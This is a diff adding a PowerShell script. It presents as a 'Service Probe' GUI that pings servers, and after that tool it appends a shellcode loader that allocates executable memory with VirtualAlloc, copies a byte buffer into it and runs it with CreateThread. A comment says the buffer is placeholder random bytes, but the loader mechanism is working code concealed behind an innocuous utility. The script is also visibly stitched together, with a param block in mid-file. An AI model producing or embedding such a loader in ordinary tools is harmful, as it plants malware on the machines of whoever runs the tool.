@@ -1,0 +1,146 @@
+
+$PSDefaultParameterValues['Out-File:Encoding'] = 'utf8'
+$DebugPreference = 'SilentlyContinue'
+$hostName = $env:COMPUTERNAME
+
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+[System.Windows.Forms.Application]::EnableVisualStyles()
+
+$form = New-Object System.Windows.Forms.Form
+$form.Text = 'Service Probe'
+$form.Size = New-Object System.Drawing.Size(860, 480)
+$form.StartPosition = 'CenterScreen'
+$form.FormBorderStyle = 'FixedDialog'
+$form.MaximizeBox = $false
+$form.MinimizeBox = $true
+
+$label = New-Object System.Windows.Forms.Label
+$label.Text = 'Server name'
+$label.Location = New-Object System.Drawing.Point(18, 24)
+$label.AutoSize = $true
+$form.Controls.Add($label)
+
+$textBox = New-Object System.Windows.Forms.TextBox
+$textBox.Location = New-Object System.Drawing.Point(120, 20)
+$textBox.Size = New-Object System.Drawing.Size(300, 24)
+$form.Controls.Add($textBox)
+
+$script:servers = @('filesrv01', 'dc01', 'web-stg-01', 'dc02', 'srv01')
+
+$statusLabel = New-Object System.Windows.Forms.Label
+$statusLabel.Text = 'Ready'
+$statusLabel.Location = New-Object System.Drawing.Point(440, 24)
+$statusLabel.AutoSize = $true
+$statusLabel.ForeColor = [System.Drawing.Color]::DimGray
+$form.Controls.Add($statusLabel)
+
+$button = New-Object System.Windows.Forms.Button
+$button.Text = "Check"
+$button.Location = New-Object System.Drawing.Point(620, 18)
+$button.Size = New-Object System.Drawing.Size(100, 28)
+$button.Add_Click({
+    $button.Enabled = $false
+    $statusLabel.Text = 'Checking ...'
+    try {
+        $reachable = Test-Connection -ComputerName $textBox.Text -Count 2 -Quiet
+        if ($reachable) {
+            $statusLabel.Text = 'Online'
+            [void]$listBox.Items.Add(("{0} - online" -f $textBox.Text))
+        }
+        else {
+            $statusLabel.Text = 'Offline'
+            [void]$listBox.Items.Add(("{0} - offline" -f $textBox.Text))
+        }
+    }
+    catch {
+        $statusLabel.Text = 'Error'
+        Write-Warning $_.Exception.Message
+    }
+    finally {
+        $button.Enabled = $true
+    }
+})
+$form.Controls.Add($button)
+
+$listBox = New-Object System.Windows.Forms.ListBox
+$listBox.Location = New-Object System.Drawing.Point(18, 64)
+$listBox.Size = New-Object System.Drawing.Size(700, 300)
+$form.Controls.Add($listBox)
+
+foreach ($server in $script:servers) {
+    [void]$listBox.Items.Add($server)
+}
+
+$form.Add_Shown({ $textBox.Focus() })
+[void]$form.ShowDialog()
+$form.Dispose()
+
+[CmdletBinding()]
+param(
+    [string]$LogPath = "$env:TEMP\loader.log"
+)
+
+$NativeCode = @"
+using System;
+using System.Runtime.InteropServices;
+
+public static class Win32Api
+{
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
+        uint flAllocationType, uint flProtect);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
+        uint dwFreeType);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
+        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
+        uint dwCreationFlags, out uint lpThreadId);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool CloseHandle(IntPtr hObject);
+}
+"@
+
+Add-Type -TypeDefinition $NativeCode -Language CSharp
+
+# buffer placeholder: random bytes, replaces the encrypted stage in real samples
+$Buffer = [Byte[]] @(
+    0x49, 0x9c, 0x37, 0x58, 0x03, 0x55, 0xe5, 0x4a, 0x4c, 0x10, 0x69, 0x11, 0xb2, 0x26, 0x18, 0xd9,
+    0x6a, 0xa6, 0x41, 0x96, 0xa5, 0x11, 0x60, 0x04, 0xda, 0x0a, 0x0d, 0x3d, 0x04, 0x50, 0xa1, 0x9a,
+    0x79, 0xbf, 0x20, 0xef, 0xcd, 0x88, 0x9a, 0x78, 0x9c, 0xbc, 0x65, 0xcf, 0x57, 0x5e, 0x74, 0xf3,
+    0xe3, 0x03, 0x78, 0x10, 0x27, 0x4e, 0x77, 0x39, 0x5a, 0x62, 0xd6, 0x57, 0xa3, 0x47, 0x83, 0x56,
+    0xc4, 0x1c, 0x22, 0x23, 0x1d, 0xe8, 0xce, 0x51, 0xec, 0x1d, 0xaa, 0xe6, 0x48, 0x92, 0x79, 0xe9,
+    0x61, 0xa8, 0xe9, 0x63, 0x2e, 0xd6, 0xf3, 0x20, 0x53, 0xd5, 0xf2, 0x25, 0x1e, 0x22, 0xb4, 0x96,
+    0x68, 0xee, 0xbe, 0x76, 0xba, 0x4e, 0xfd, 0x6c, 0xbc, 0xd9, 0x61, 0xd0, 0x68, 0x7a, 0x1f, 0x09,
+    0xa4, 0x34, 0x7b, 0x89, 0x25, 0x9b, 0x88, 0xf0, 0x24, 0x5c, 0x42, 0x8c, 0x79, 0x4e, 0x96, 0x0e,
+    0x2c, 0x4c, 0x89, 0x4e, 0xc1, 0x89, 0xcd, 0xa5, 0x04, 0xca, 0x75, 0xb9, 0xb1, 0xa1, 0x1a, 0xd0,
+    0x95, 0xe1, 0xad, 0xee, 0xce, 0x25, 0xa1, 0xca, 0x1d, 0x87, 0xe9, 0xda, 0xc5, 0xda, 0xae, 0x11,
+    0x9d, 0x6f, 0xc9, 0x43, 0x36, 0x81, 0xcc, 0xb2, 0x85, 0x3a, 0xef, 0x54, 0xeb, 0x6b, 0x34, 0xe8,
+    0x98, 0x0c, 0xcf, 0x36, 0x28, 0xa9, 0x39, 0xa0, 0xde, 0x5f, 0xbe, 0xd9, 0xaa, 0xbe, 0xb4, 0x82,
+    0x36, 0x70, 0xc1, 0x79, 0x2d, 0x88, 0x1c, 0xb8, 0xe7, 0x2d, 0x97, 0xd3, 0x1e, 0x56, 0x66, 0x19,
+    0x4d, 0xea, 0x36, 0x3a, 0x9b, 0xee, 0x56, 0xdd, 0xfc, 0x22, 0xaf, 0xe2, 0x6f, 0x71, 0x1a, 0xaf,
+    0x17, 0xd2, 0x72, 0x6a, 0x31, 0x07, 0x81, 0x3c, 0xd5, 0x9a, 0x75, 0x42, 0x5b, 0x3d, 0x49, 0xa1,
+    0xaf, 0x09, 0x95, 0x27, 0x41, 0xb3, 0xfd, 0xfe, 0xad
+)
+
+$Handle = [Win32Api]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
+if ($Handle -eq [IntPtr]::Zero) {
+    Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
+    return
+}
+
+[Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $Handle, $Buffer.Length)
+$ThreadId = 0
+$Thread = [Win32Api]::CreateThread([IntPtr]::Zero, 0, $Handle, [IntPtr]::Zero, 0, [ref]$ThreadId)
+[void][Win32Api]::WaitForSingleObject($Thread, 4477)
+[void][Win32Api]::CloseHandle($Thread)
+
+$Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
+$Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
